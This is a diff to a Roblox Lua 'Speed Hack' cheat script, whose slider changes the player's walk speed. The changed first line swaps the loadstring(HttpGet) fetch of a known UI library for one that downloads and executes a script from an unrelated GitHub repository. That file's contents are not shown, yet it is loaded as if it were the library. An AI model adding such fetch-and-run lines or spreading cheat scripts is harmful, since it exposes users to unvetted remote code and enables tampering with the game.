@@ -1,4 +1,4 @@
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/Library.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/gislle/cronaaa/refs/heads/main/script.lua"))()
 local Window = Library:CreateWindow("Speed Hack")
 local MainTab = Window:AddTab("Main")
 
@@ -17,3 +17,4 @@ local SpeedSlider = MainTab:AddSlider("WalkSpeed", {
 SpeedSlider:OnChanged(function(Value)
     Humanoid.WalkSpeed = Value
 end)
+
